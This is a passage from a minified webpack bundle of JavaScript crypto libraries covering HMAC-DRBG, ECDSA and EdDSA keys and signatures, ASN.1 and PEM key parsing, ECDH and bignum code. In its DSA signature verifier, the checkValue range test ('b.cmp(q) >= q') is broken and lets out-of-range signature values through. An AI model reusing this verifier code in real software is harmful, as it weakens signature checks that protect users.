            assert(entropy.length >= this.minEntropy / 8, "Not enough entropy. Minimum is: " + this.minEntropy + " bits"), this._init(entropy, nonce, pers);
        }
        (module.exports = HmacDRBG),
            (HmacDRBG.prototype._init = function (entropy, nonce, pers) {
                var seed = entropy.concat(nonce).concat(pers);
                (this.K = new Array(this.outLen / 8)), (this.V = new Array(this.outLen / 8));
                for (var i = 0; i < this.V.length; i++) (this.K[i] = 0), (this.V[i] = 1);
                this._update(seed), (this._reseed = 1), (this.reseedInterval = 281474976710656);
            }),
            (HmacDRBG.prototype._hmac = function () {
                return new hash.hmac(this.hash, this.K);
            }),
            (HmacDRBG.prototype._update = function (seed) {
                var kmac = this._hmac().update(this.V).update([0]);
                seed && (kmac = kmac.update(seed)),
                    (this.K = kmac.digest()),
                    (this.V = this._hmac().update(this.V).digest()),
                    seed && ((this.K = this._hmac().update(this.V).update([1]).update(seed).digest()), (this.V = this._hmac().update(this.V).digest()));
            }),
            (HmacDRBG.prototype.reseed = function (entropy, entropyEnc, add, addEnc) {
                "string" != typeof entropyEnc && ((addEnc = add), (add = entropyEnc), (entropyEnc = null)),
                    (entropy = utils.toArray(entropy, entropyEnc)),
                    (add = utils.toArray(add, addEnc)),
                    assert(entropy.length >= this.minEntropy / 8, "Not enough entropy. Minimum is: " + this.minEntropy + " bits"),
                    this._update(entropy.concat(add || [])),
                    (this._reseed = 1);
            }),
            (HmacDRBG.prototype.generate = function (len, enc, add, addEnc) {
                if (this._reseed > this.reseedInterval) throw new Error("Reseed is required");
                "string" != typeof enc && ((addEnc = add), (add = enc), (enc = null)), add && ((add = utils.toArray(add, addEnc || "hex")), this._update(add));
                for (var temp = []; temp.length < len; ) (this.V = this._hmac().update(this.V).digest()), (temp = temp.concat(this.V));
                var res = temp.slice(0, len);
                return this._update(add), this._reseed++, utils.encode(res, enc);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var BN = __webpack_require__(15),
            assert = __webpack_require__(12).assert;
        function KeyPair(ec, options) {
            (this.ec = ec), (this.priv = null), (this.pub = null), options.priv && this._importPrivate(options.priv, options.privEnc), options.pub && this._importPublic(options.pub, options.pubEnc);
        }
        (module.exports = KeyPair),
            (KeyPair.fromPublic = function (ec, pub, enc) {
                return pub instanceof KeyPair ? pub : new KeyPair(ec, { pub: pub, pubEnc: enc });
            }),
            (KeyPair.fromPrivate = function (ec, priv, enc) {
                return priv instanceof KeyPair ? priv : new KeyPair(ec, { priv: priv, privEnc: enc });
            }),
            (KeyPair.prototype.validate = function () {
                var pub = this.getPublic();
                return pub.isInfinity()
                    ? { result: !1, reason: "Invalid public key" }
                    : pub.validate()
                    ? pub.mul(this.ec.curve.n).isInfinity()
                        ? { result: !0, reason: null }
                        : { result: !1, reason: "Public key * N != O" }
                    : { result: !1, reason: "Public key is not a point" };
            }),
            (KeyPair.prototype.getPublic = function (compact, enc) {
                return "string" == typeof compact && ((enc = compact), (compact = null)), this.pub || (this.pub = this.ec.g.mul(this.priv)), enc ? this.pub.encode(enc, compact) : this.pub;
            }),
            (KeyPair.prototype.getPrivate = function (enc) {
                return "hex" === enc ? this.priv.toString(16, 2) : this.priv;
            }),
            (KeyPair.prototype._importPrivate = function (key, enc) {
                (this.priv = new BN(key, enc || 16)), (this.priv = this.priv.umod(this.ec.curve.n));
            }),
            (KeyPair.prototype._importPublic = function (key, enc) {
                if (key.x || key.y)
                    return (
                        "mont" === this.ec.curve.type ? assert(key.x, "Need x coordinate") : ("short" !== this.ec.curve.type && "edwards" !== this.ec.curve.type) || assert(key.x && key.y, "Need both x and y coordinate"),
                        void (this.pub = this.ec.curve.point(key.x, key.y))
                    );
                this.pub = this.ec.curve.decodePoint(key, enc);
            }),
            (KeyPair.prototype.derive = function (pub) {
                return pub.validate() || assert(pub.validate(), "public point not validated"), pub.mul(this.priv).getX();
            }),
            (KeyPair.prototype.sign = function (msg, enc, options) {
                return this.ec.sign(msg, this, enc, options);
            }),
            (KeyPair.prototype.verify = function (msg, signature) {
                return this.ec.verify(msg, signature, this);
            }),
            (KeyPair.prototype.inspect = function () {
                return "<Key priv: " + (this.priv && this.priv.toString(16, 2)) + " pub: " + (this.pub && this.pub.inspect()) + " >";
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var BN = __webpack_require__(15),
            utils = __webpack_require__(12),
            assert = utils.assert;
        function Signature(options, enc) {
            if (options instanceof Signature) return options;
            this._importDER(options, enc) ||
                (assert(options.r && options.s, "Signature without r or s"),
                (this.r = new BN(options.r, 16)),
                (this.s = new BN(options.s, 16)),
                void 0 === options.recoveryParam ? (this.recoveryParam = null) : (this.recoveryParam = options.recoveryParam));
        }
        function Position() {
            this.place = 0;
        }
        function getLength(buf, p) {
            var initial = buf[p.place++];
            if (!(128 & initial)) return initial;
            var octetLen = 15 & initial;
            if (0 === octetLen || octetLen > 4) return !1;
            for (var val = 0, i = 0, off = p.place; i < octetLen; i++, off++) (val <<= 8), (val |= buf[off]), (val >>>= 0);
            return !(val <= 127) && ((p.place = off), val);
        }
        function rmPadding(buf) {
            for (var i = 0, len = buf.length - 1; !buf[i] && !(128 & buf[i + 1]) && i < len; ) i++;
            return 0 === i ? buf : buf.slice(i);
        }
        function constructLength(arr, len) {
            if (len < 128) arr.push(len);
            else {
                var octets = 1 + ((Math.log(len) / Math.LN2) >>> 3);
                for (arr.push(128 | octets); --octets; ) arr.push((len >>> (octets << 3)) & 255);
                arr.push(len);
            }
        }
        (module.exports = Signature),
            (Signature.prototype._importDER = function (data, enc) {
                data = utils.toArray(data, enc);
                var p = new Position();
                if (48 !== data[p.place++]) return !1;
                var len = getLength(data, p);
                if (!1 === len) return !1;
                if (len + p.place !== data.length) return !1;
                if (2 !== data[p.place++]) return !1;
                var rlen = getLength(data, p);
                if (!1 === rlen) return !1;
                var r = data.slice(p.place, rlen + p.place);
                if (((p.place += rlen), 2 !== data[p.place++])) return !1;
                var slen = getLength(data, p);
                if (!1 === slen) return !1;
                if (data.length !== slen + p.place) return !1;
                var s = data.slice(p.place, slen + p.place);
                if (0 === r[0]) {
                    if (!(128 & r[1])) return !1;
                    r = r.slice(1);
                }
                if (0 === s[0]) {
                    if (!(128 & s[1])) return !1;
                    s = s.slice(1);
                }
                return (this.r = new BN(r)), (this.s = new BN(s)), (this.recoveryParam = null), !0;
            }),
            (Signature.prototype.toDER = function (enc) {
                var r = this.r.toArray(),
                    s = this.s.toArray();
                for (128 & r[0] && (r = [0].concat(r)), 128 & s[0] && (s = [0].concat(s)), r = rmPadding(r), s = rmPadding(s); !(s[0] || 128 & s[1]); ) s = s.slice(1);
                var arr = [2];
                constructLength(arr, r.length), (arr = arr.concat(r)).push(2), constructLength(arr, s.length);
                var backHalf = arr.concat(s),
                    res = [48];
                return constructLength(res, backHalf.length), (res = res.concat(backHalf)), utils.encode(res, enc);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var hash = __webpack_require__(61),
            curves = __webpack_require__(60),
            utils = __webpack_require__(12),
            assert = utils.assert,
            parseBytes = utils.parseBytes,
            KeyPair = __webpack_require__(268),
            Signature = __webpack_require__(269);
        function EDDSA(curve) {
            if ((assert("ed25519" === curve, "only tested with ed25519 so far"), !(this instanceof EDDSA))) return new EDDSA(curve);
            (curve = curves[curve].curve),
                (this.curve = curve),
                (this.g = curve.g),
                this.g.precompute(curve.n.bitLength() + 1),
                (this.pointClass = curve.point().constructor),
                (this.encodingLength = Math.ceil(curve.n.bitLength() / 8)),
                (this.hash = hash.sha512);
        }
        (module.exports = EDDSA),
            (EDDSA.prototype.sign = function (message, secret) {
                message = parseBytes(message);
                var key = this.keyFromSecret(secret),
                    r = this.hashInt(key.messagePrefix(), message),
                    R = this.g.mul(r),
                    Rencoded = this.encodePoint(R),
                    s_ = this.hashInt(Rencoded, key.pubBytes(), message).mul(key.priv()),
                    S = r.add(s_).umod(this.curve.n);
                return this.makeSignature({ R: R, S: S, Rencoded: Rencoded });
            }),
            (EDDSA.prototype.verify = function (message, sig, pub) {
                (message = parseBytes(message)), (sig = this.makeSignature(sig));
                var key = this.keyFromPublic(pub),
                    h = this.hashInt(sig.Rencoded(), key.pubBytes(), message),
                    SG = this.g.mul(sig.S());
                return sig.R().add(key.pub().mul(h)).eq(SG);
            }),
            (EDDSA.prototype.hashInt = function () {
                for (var hash = this.hash(), i = 0; i < arguments.length; i++) hash.update(arguments[i]);
                return utils.intFromLE(hash.digest()).umod(this.curve.n);
            }),
            (EDDSA.prototype.keyFromPublic = function (pub) {
                return KeyPair.fromPublic(this, pub);
            }),
            (EDDSA.prototype.keyFromSecret = function (secret) {
                return KeyPair.fromSecret(this, secret);
            }),
            (EDDSA.prototype.makeSignature = function (sig) {
                return sig instanceof Signature ? sig : new Signature(this, sig);
            }),
            (EDDSA.prototype.encodePoint = function (point) {
                var enc = point.getY().toArray("le", this.encodingLength);
                return (enc[this.encodingLength - 1] |= point.getX().isOdd() ? 128 : 0), enc;
            }),
            (EDDSA.prototype.decodePoint = function (bytes) {
                var lastIx = (bytes = utils.parseBytes(bytes)).length - 1,
                    normed = bytes.slice(0, lastIx).concat(-129 & bytes[lastIx]),
                    xIsOdd = 0 != (128 & bytes[lastIx]),
                    y = utils.intFromLE(normed);
                return this.curve.pointFromY(y, xIsOdd);
            }),
            (EDDSA.prototype.encodeInt = function (num) {
                return num.toArray("le", this.encodingLength);
            }),
            (EDDSA.prototype.decodeInt = function (bytes) {
                return utils.intFromLE(bytes);
            }),
            (EDDSA.prototype.isPoint = function (val) {
                return val instanceof this.pointClass;
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(12),
            assert = utils.assert,
            parseBytes = utils.parseBytes,
            cachedProperty = utils.cachedProperty;
        function KeyPair(eddsa, params) {
            (this.eddsa = eddsa), (this._secret = parseBytes(params.secret)), eddsa.isPoint(params.pub) ? (this._pub = params.pub) : (this._pubBytes = parseBytes(params.pub));
        }
        (KeyPair.fromPublic = function (eddsa, pub) {
            return pub instanceof KeyPair ? pub : new KeyPair(eddsa, { pub: pub });
        }),
            (KeyPair.fromSecret = function (eddsa, secret) {
                return secret instanceof KeyPair ? secret : new KeyPair(eddsa, { secret: secret });
            }),
            (KeyPair.prototype.secret = function () {
                return this._secret;
            }),
            cachedProperty(KeyPair, "pubBytes", function () {
                return this.eddsa.encodePoint(this.pub());
            }),
            cachedProperty(KeyPair, "pub", function () {
                return this._pubBytes ? this.eddsa.decodePoint(this._pubBytes) : this.eddsa.g.mul(this.priv());
            }),
            cachedProperty(KeyPair, "privBytes", function () {
                var eddsa = this.eddsa,
                    hash = this.hash(),
                    lastIx = eddsa.encodingLength - 1,
                    a = hash.slice(0, eddsa.encodingLength);
                return (a[0] &= 248), (a[lastIx] &= 127), (a[lastIx] |= 64), a;
            }),
            cachedProperty(KeyPair, "priv", function () {
                return this.eddsa.decodeInt(this.privBytes());
            }),
            cachedProperty(KeyPair, "hash", function () {
                return this.eddsa.hash().update(this.secret()).digest();
            }),
            cachedProperty(KeyPair, "messagePrefix", function () {
                return this.hash().slice(this.eddsa.encodingLength);
            }),
            (KeyPair.prototype.sign = function (message) {
                return assert(this._secret, "KeyPair can only verify"), this.eddsa.sign(message, this);
            }),
            (KeyPair.prototype.verify = function (message, sig) {
                return this.eddsa.verify(message, sig, this);
            }),
            (KeyPair.prototype.getSecret = function (enc) {
                return assert(this._secret, "KeyPair is public only"), utils.encode(this.secret(), enc);
            }),
            (KeyPair.prototype.getPublic = function (enc) {
                return utils.encode(this.pubBytes(), enc);
            }),
            (module.exports = KeyPair);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var BN = __webpack_require__(15),
            utils = __webpack_require__(12),
            assert = utils.assert,
            cachedProperty = utils.cachedProperty,
            parseBytes = utils.parseBytes;
        function Signature(eddsa, sig) {
            (this.eddsa = eddsa),
                "object" != typeof sig && (sig = parseBytes(sig)),
                Array.isArray(sig) && (sig = { R: sig.slice(0, eddsa.encodingLength), S: sig.slice(eddsa.encodingLength) }),
                assert(sig.R && sig.S, "Signature without R or S"),
                eddsa.isPoint(sig.R) && (this._R = sig.R),
                sig.S instanceof BN && (this._S = sig.S),
                (this._Rencoded = Array.isArray(sig.R) ? sig.R : sig.Rencoded),
                (this._Sencoded = Array.isArray(sig.S) ? sig.S : sig.Sencoded);
        }
        cachedProperty(Signature, "S", function () {
            return this.eddsa.decodeInt(this.Sencoded());
        }),
            cachedProperty(Signature, "R", function () {
                return this.eddsa.decodePoint(this.Rencoded());
            }),
            cachedProperty(Signature, "Rencoded", function () {
                return this.eddsa.encodePoint(this.R());
            }),
            cachedProperty(Signature, "Sencoded", function () {
                return this.eddsa.encodeInt(this.S());
            }),
            (Signature.prototype.toBytes = function () {
                return this.Rencoded().concat(this.Sencoded());
            }),
            (Signature.prototype.toHex = function () {
                return utils.encode(this.toBytes(), "hex").toUpperCase();
            }),
            (module.exports = Signature);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var asn1 = __webpack_require__(124);
        exports.certificate = __webpack_require__(277);
        var RSAPrivateKey = asn1.define("RSAPrivateKey", function () {
            this.seq().obj(
                this.key("version").int(),
                this.key("modulus").int(),
                this.key("publicExponent").int(),
                this.key("privateExponent").int(),
                this.key("prime1").int(),
                this.key("prime2").int(),
                this.key("exponent1").int(),
                this.key("exponent2").int(),
                this.key("coefficient").int()
            );
        });
        exports.RSAPrivateKey = RSAPrivateKey;
        var RSAPublicKey = asn1.define("RSAPublicKey", function () {
            this.seq().obj(this.key("modulus").int(), this.key("publicExponent").int());
        });
        exports.RSAPublicKey = RSAPublicKey;
        var PublicKey = asn1.define("SubjectPublicKeyInfo", function () {
            this.seq().obj(this.key("algorithm").use(AlgorithmIdentifier), this.key("subjectPublicKey").bitstr());
        });
        exports.PublicKey = PublicKey;
        var AlgorithmIdentifier = asn1.define("AlgorithmIdentifier", function () {
                this.seq().obj(
                    this.key("algorithm").objid(),
                    this.key("none").null_().optional(),
                    this.key("curve").objid().optional(),
                    this.key("params").seq().obj(this.key("p").int(), this.key("q").int(), this.key("g").int()).optional()
                );
            }),
            PrivateKeyInfo = asn1.define("PrivateKeyInfo", function () {
                this.seq().obj(this.key("version").int(), this.key("algorithm").use(AlgorithmIdentifier), this.key("subjectPrivateKey").octstr());
            });
        exports.PrivateKey = PrivateKeyInfo;
        var EncryptedPrivateKeyInfo = asn1.define("EncryptedPrivateKeyInfo", function () {
            this.seq().obj(
                this.key("algorithm")
                    .seq()
                    .obj(
                        this.key("id").objid(),
                        this.key("decrypt")
                            .seq()
                            .obj(
                                this.key("kde")
                                    .seq()
                                    .obj(this.key("id").objid(), this.key("kdeparams").seq().obj(this.key("salt").octstr(), this.key("iters").int())),
                                this.key("cipher").seq().obj(this.key("algo").objid(), this.key("iv").octstr())
                            )
                    ),
                this.key("subjectPrivateKey").octstr()
            );
        });
        exports.EncryptedPrivateKey = EncryptedPrivateKeyInfo;
        var DSAPrivateKey = asn1.define("DSAPrivateKey", function () {
            this.seq().obj(this.key("version").int(), this.key("p").int(), this.key("q").int(), this.key("g").int(), this.key("pub_key").int(), this.key("priv_key").int());
        });
        (exports.DSAPrivateKey = DSAPrivateKey),
            (exports.DSAparam = asn1.define("DSAparam", function () {
                this.int();
            }));
        var ECPrivateKey = asn1.define("ECPrivateKey", function () {
            this.seq().obj(this.key("version").int(), this.key("privateKey").octstr(), this.key("parameters").optional().explicit(0).use(ECParameters), this.key("publicKey").optional().explicit(1).bitstr());
        });
        exports.ECPrivateKey = ECPrivateKey;
        var ECParameters = asn1.define("ECParameters", function () {
            this.choice({ namedCurve: this.objid() });
        });
        exports.signature = asn1.define("signature", function () {
            this.seq().obj(this.key("r").int(), this.key("s").int());
        });
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        "use strict";
        const encoders = __webpack_require__(126),
            decoders = __webpack_require__(128),
            inherits = __webpack_require__(3);
        function Entity(name, body) {
            (this.name = name), (this.body = body), (this.decoders = {}), (this.encoders = {});
        }
        (exports.define = function (name, body) {
            return new Entity(name, body);
        }),
            (Entity.prototype._createNamed = function (Base) {
                const name = this.name;
                function Generated(entity) {
                    this._initNamed(entity, name);
                }
                return (
                    inherits(Generated, Base),
                    (Generated.prototype._initNamed = function (entity, name) {
                        Base.call(this, entity, name);
                    }),
                    new Generated(this)
                );
            }),
            (Entity.prototype._getDecoder = function (enc) {
                return (enc = enc || "der"), this.decoders.hasOwnProperty(enc) || (this.decoders[enc] = this._createNamed(decoders[enc])), this.decoders[enc];
            }),
            (Entity.prototype.decode = function (data, enc, options) {
                return this._getDecoder(enc).decode(data, options);
            }),
            (Entity.prototype._getEncoder = function (enc) {
                return (enc = enc || "der"), this.encoders.hasOwnProperty(enc) || (this.encoders[enc] = this._createNamed(encoders[enc])), this.encoders[enc];
            }),
            (Entity.prototype.encode = function (data, enc, reporter) {
                return this._getEncoder(enc).encode(data, reporter);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const inherits = __webpack_require__(3),
            DEREncoder = __webpack_require__(127);
        function PEMEncoder(entity) {
            DEREncoder.call(this, entity), (this.enc = "pem");
        }
        inherits(PEMEncoder, DEREncoder),
            (module.exports = PEMEncoder),
            (PEMEncoder.prototype.encode = function (data, options) {
                const p = DEREncoder.prototype.encode.call(this, data).toString("base64"),
                    out = ["-----BEGIN " + options.label + "-----"];
                for (let i = 0; i < p.length; i += 64) out.push(p.slice(i, i + 64));
                return out.push("-----END " + options.label + "-----"), out.join("\n");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const inherits = __webpack_require__(3),
            Buffer = __webpack_require__(62).Buffer,
            DERDecoder = __webpack_require__(129);
        function PEMDecoder(entity) {
            DERDecoder.call(this, entity), (this.enc = "pem");
        }
        inherits(PEMDecoder, DERDecoder),
            (module.exports = PEMDecoder),
            (PEMDecoder.prototype.decode = function (data, options) {
                const lines = data.toString().split(/[\r\n]+/g),
                    label = options.label.toUpperCase(),
                    re = /^-----(BEGIN|END) ([^-]+)-----$/;
                let start = -1,
                    end = -1;
                for (let i = 0; i < lines.length; i++) {
                    const match = lines[i].match(re);
                    if (null !== match && match[2] === label) {
                        if (-1 !== start) {
                            if ("END" !== match[1]) break;
                            end = i;
                            break;
                        }
                        if ("BEGIN" !== match[1]) break;
                        start = i;
                    }
                }
                if (-1 === start || -1 === end) throw new Error("PEM section not found for: " + label);
                const base64 = lines.slice(start + 1, end).join("");
                base64.replace(/[^a-z0-9+/=]+/gi, "");
                const input = Buffer.from(base64, "base64");
                return DERDecoder.prototype.decode.call(this, input, options);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const base = exports;
        (base.Reporter = __webpack_require__(64).Reporter), (base.DecoderBuffer = __webpack_require__(37).DecoderBuffer), (base.EncoderBuffer = __webpack_require__(37).EncoderBuffer), (base.Node = __webpack_require__(63));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const constants = exports;
        (constants._reverse = function (map) {
            const res = {};
            return (
                Object.keys(map).forEach(function (key) {
                    (0 | key) == key && (key |= 0);
                    const value = map[key];
                    res[value] = key;
                }),
                res
            );
        }),
            (constants.der = __webpack_require__(65));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var asn = __webpack_require__(124),
            Time = asn.define("Time", function () {
                this.choice({ utcTime: this.utctime(), generalTime: this.gentime() });
            }),
            AttributeTypeValue = asn.define("AttributeTypeValue", function () {
                this.seq().obj(this.key("type").objid(), this.key("value").any());
            }),
            AlgorithmIdentifier = asn.define("AlgorithmIdentifier", function () {
                this.seq().obj(this.key("algorithm").objid(), this.key("parameters").optional(), this.key("curve").objid().optional());
            }),
            SubjectPublicKeyInfo = asn.define("SubjectPublicKeyInfo", function () {
                this.seq().obj(this.key("algorithm").use(AlgorithmIdentifier), this.key("subjectPublicKey").bitstr());
            }),
            RelativeDistinguishedName = asn.define("RelativeDistinguishedName", function () {
                this.setof(AttributeTypeValue);
            }),
            RDNSequence = asn.define("RDNSequence", function () {
                this.seqof(RelativeDistinguishedName);
            }),
            Name = asn.define("Name", function () {
                this.choice({ rdnSequence: this.use(RDNSequence) });
            }),
            Validity = asn.define("Validity", function () {
                this.seq().obj(this.key("notBefore").use(Time), this.key("notAfter").use(Time));
            }),
            Extension = asn.define("Extension", function () {
                this.seq().obj(this.key("extnID").objid(), this.key("critical").bool().def(!1), this.key("extnValue").octstr());
            }),
            TBSCertificate = asn.define("TBSCertificate", function () {
                this.seq().obj(
                    this.key("version").explicit(0).int().optional(),
                    this.key("serialNumber").int(),
                    this.key("signature").use(AlgorithmIdentifier),
                    this.key("issuer").use(Name),
                    this.key("validity").use(Validity),
                    this.key("subject").use(Name),
                    this.key("subjectPublicKeyInfo").use(SubjectPublicKeyInfo),
                    this.key("issuerUniqueID").implicit(1).bitstr().optional(),
                    this.key("subjectUniqueID").implicit(2).bitstr().optional(),
                    this.key("extensions").explicit(3).seqof(Extension).optional()
                );
            }),
            X509Certificate = asn.define("X509Certificate", function () {
                this.seq().obj(this.key("tbsCertificate").use(TBSCertificate), this.key("signatureAlgorithm").use(AlgorithmIdentifier), this.key("signatureValue").bitstr());
            });
        module.exports = X509Certificate;
    },
    function (module) {
        module.exports = JSON.parse(
            '{"2.16.840.1.101.3.4.1.1":"aes-128-ecb","2.16.840.1.101.3.4.1.2":"aes-128-cbc","2.16.840.1.101.3.4.1.3":"aes-128-ofb","2.16.840.1.101.3.4.1.4":"aes-128-cfb","2.16.840.1.101.3.4.1.21":"aes-192-ecb","2.16.840.1.101.3.4.1.22":"aes-192-cbc","2.16.840.1.101.3.4.1.23":"aes-192-ofb","2.16.840.1.101.3.4.1.24":"aes-192-cfb","2.16.840.1.101.3.4.1.41":"aes-256-ecb","2.16.840.1.101.3.4.1.42":"aes-256-cbc","2.16.840.1.101.3.4.1.43":"aes-256-ofb","2.16.840.1.101.3.4.1.44":"aes-256-cfb"}'
        );
    },
    function (module, exports, __webpack_require__) {
        var findProc = /Proc-Type: 4,ENCRYPTED[\n\r]+DEK-Info: AES-((?:128)|(?:192)|(?:256))-CBC,([0-9A-H]+)[\n\r]+([0-9A-z\n\r+/=]+)[\n\r]+/m,
            startRegex = /^-----BEGIN ((?:.*? KEY)|CERTIFICATE)-----/m,
            fullRegex = /^-----BEGIN ((?:.*? KEY)|CERTIFICATE)-----([0-9A-z\n\r+/=]+)-----END \1-----$/m,
            evp = __webpack_require__(40),
            ciphers = __webpack_require__(52),
            Buffer = __webpack_require__(5).Buffer;
        module.exports = function (okey, password) {
            var decrypted,
                key = okey.toString(),
                match = key.match(findProc);
            if (match) {
                var suite = "aes" + match[1],
                    iv = Buffer.from(match[2], "hex"),
                    cipherText = Buffer.from(match[3].replace(/[\r\n]/g, ""), "base64"),
                    cipherKey = evp(password, iv.slice(0, 8), parseInt(match[1], 10)).key,
                    out = [],
                    cipher = ciphers.createDecipheriv(suite, cipherKey, iv);
                out.push(cipher.update(cipherText)), out.push(cipher.final()), (decrypted = Buffer.concat(out));
            } else {
                var match2 = key.match(fullRegex);
                decrypted = Buffer.from(match2[2].replace(/[\r\n]/g, ""), "base64");
            }
            return { tag: key.match(startRegex)[1], data: decrypted };
        };
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(55).Buffer,
            BN = __webpack_require__(58),
            EC = __webpack_require__(59).ec,
            parseKeys = __webpack_require__(42),
            curves = __webpack_require__(130);
        function checkValue(b, q) {
            if (b.cmpn(0) <= 0) throw new Error("invalid sig");
            if (b.cmp(q) >= q) throw new Error("invalid sig");
        }
        module.exports = function (sig, hash, key, signType, tag) {
            var pub = parseKeys(key);
            if ("ec" === pub.type) {
                if ("ecdsa" !== signType && "ecdsa/rsa" !== signType) throw new Error("wrong public key type");
                return (function (sig, hash, pub) {
                    var curveId = curves[pub.data.algorithm.curve.join(".")];
                    if (!curveId) throw new Error("unknown curve " + pub.data.algorithm.curve.join("."));
                    var curve = new EC(curveId),
                        pubkey = pub.data.subjectPrivateKey.data;
                    return curve.verify(hash, sig, pubkey);
                })(sig, hash, pub);
            }
            if ("dsa" === pub.type) {
                if ("dsa" !== signType) throw new Error("wrong public key type");
                return (function (sig, hash, pub) {
                    var p = pub.data.p,
                        q = pub.data.q,
                        g = pub.data.g,
                        y = pub.data.pub_key,
                        unpacked = parseKeys.signature.decode(sig, "der"),
                        s = unpacked.s,
                        r = unpacked.r;
                    checkValue(s, q), checkValue(r, q);
                    var montp = BN.mont(p),
                        w = s.invm(q);
                    return (
                        0 ===
                        g
                            .toRed(montp)
                            .redPow(new BN(hash).mul(w).mod(q))
                            .fromRed()
                            .mul(y.toRed(montp).redPow(r.mul(w).mod(q)).fromRed())
                            .mod(p)
                            .mod(q)
                            .cmp(r)
                    );
                })(sig, hash, pub);
            }
            if ("rsa" !== signType && "ecdsa/rsa" !== signType) throw new Error("wrong public key type");
            hash = Buffer.concat([tag, hash]);
            for (var len = pub.modulus.byteLength(), pad = [1], padNum = 0; hash.length + pad.length + 2 < len; ) pad.push(255), padNum++;
            pad.push(0);
            for (var i = -1; ++i < hash.length; ) pad.push(hash[i]);
            pad = Buffer.from(pad);
            var red = BN.mont(pub.modulus);
            (sig = (sig = new BN(sig).toRed(red)).redPow(new BN(pub.publicExponent))), (sig = Buffer.from(sig.fromRed().toArray()));
            var out = padNum < 8 ? 1 : 0;
            for (len = Math.min(sig.length, pad.length), sig.length !== pad.length && (out = 1), i = -1; ++i < len; ) out |= sig[i] ^ pad[i];
            return 0 === out;
        };
    },
    function (module, exports, __webpack_require__) {
        (function (Buffer) {
            var elliptic = __webpack_require__(59),
                BN = __webpack_require__(282);
            module.exports = function (curve) {
                return new ECDH(curve);
            };
            var aliases = {
                secp256k1: { name: "secp256k1", byteLength: 32 },
                secp224r1: { name: "p224", byteLength: 28 },
                prime256v1: { name: "p256", byteLength: 32 },
                prime192v1: { name: "p192", byteLength: 24 },
                ed25519: { name: "ed25519", byteLength: 32 },
                secp384r1: { name: "p384", byteLength: 48 },
                secp521r1: { name: "p521", byteLength: 66 },
            };
            function ECDH(curve) {
                (this.curveType = aliases[curve]), this.curveType || (this.curveType = { name: curve }), (this.curve = new elliptic.ec(this.curveType.name)), (this.keys = void 0);
            }
            function formatReturnValue(bn, enc, len) {
                Array.isArray(bn) || (bn = bn.toArray());
                var buf = new Buffer(bn);
                if (len && buf.length < len) {
                    var zeros = new Buffer(len - buf.length);
                    zeros.fill(0), (buf = Buffer.concat([zeros, buf]));
                }
                return enc ? buf.toString(enc) : buf;
            }
            (aliases.p224 = aliases.secp224r1),
                (aliases.p256 = aliases.secp256r1 = aliases.prime256v1),
                (aliases.p192 = aliases.secp192r1 = aliases.prime192v1),
                (aliases.p384 = aliases.secp384r1),
                (aliases.p521 = aliases.secp521r1),
                (ECDH.prototype.generateKeys = function (enc, format) {
                    return (this.keys = this.curve.genKeyPair()), this.getPublicKey(enc, format);
                }),
                (ECDH.prototype.computeSecret = function (other, inenc, enc) {
                    return (
                        (inenc = inenc || "utf8"),
                        Buffer.isBuffer(other) || (other = new Buffer(other, inenc)),
                        formatReturnValue(this.curve.keyFromPublic(other).getPublic().mul(this.keys.getPrivate()).getX(), enc, this.curveType.byteLength)
                    );
                }),
                (ECDH.prototype.getPublicKey = function (enc, format) {
                    var key = this.keys.getPublic("compressed" === format, !0);
                    return "hybrid" === format && (key[key.length - 1] % 2 ? (key[0] = 7) : (key[0] = 6)), formatReturnValue(key, enc);
                }),
                (ECDH.prototype.getPrivateKey = function (enc) {
                    return formatReturnValue(this.keys.getPrivate(), enc);
                }),
                (ECDH.prototype.setPublicKey = function (pub, enc) {
                    return (enc = enc || "utf8"), Buffer.isBuffer(pub) || (pub = new Buffer(pub, enc)), this.keys._importPublic(pub), this;
                }),
                (ECDH.prototype.setPrivateKey = function (priv, enc) {
                    (enc = enc || "utf8"), Buffer.isBuffer(priv) || (priv = new Buffer(priv, enc));
                    var _priv = new BN(priv);
                    return (_priv = _priv.toString(16)), (this.keys = this.curve.genKeyPair()), this.keys._importPrivate(_priv), this;
                });
        }.call(this, __webpack_require__(6).Buffer));
    },
    function (module, exports, __webpack_require__) {
        (function (module) {
            !(function (module, exports) {
                "use strict";
                function assert(val, msg) {
                    if (!val) throw new Error(msg || "Assertion failed");
                }
                function inherits(ctor, superCtor) {
                    ctor.super_ = superCtor;
                    var TempCtor = function () {};
                    (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                }
                function BN(number, base, endian) {
                    if (BN.isBN(number)) return number;
                    (this.negative = 0),
                        (this.words = null),
                        (this.length = 0),
                        (this.red = null),
                        null !== number && (("le" !== base && "be" !== base) || ((endian = base), (base = 10)), this._init(number || 0, base || 10, endian || "be"));
                }
                var Buffer;
                "object" == typeof module ? (module.exports = BN) : (exports.BN = BN), (BN.BN = BN), (BN.wordSize = 26);
                try {
                    Buffer = "undefined" != typeof window && void 0 !== window.Buffer ? window.Buffer : __webpack_require__(283).Buffer;
                } catch (e) {}
                function parseHex4Bits(string, index) {
                    var c = string.charCodeAt(index);
                    return c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : (c - 48) & 15;
                }
                function parseHexByte(string, lowerBound, index) {
                    var r = parseHex4Bits(string, index);
                    return index - 1 >= lowerBound && (r |= parseHex4Bits(string, index - 1) << 4), r;
                }
                function parseBase(str, start, end, mul) {
                    for (var r = 0, len = Math.min(str.length, end), i = start; i < len; i++) {
                        var c = str.charCodeAt(i) - 48;
                        (r *= mul), (r += c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c);
                    }
                    return r;
                }
                (BN.isBN = function (num) {
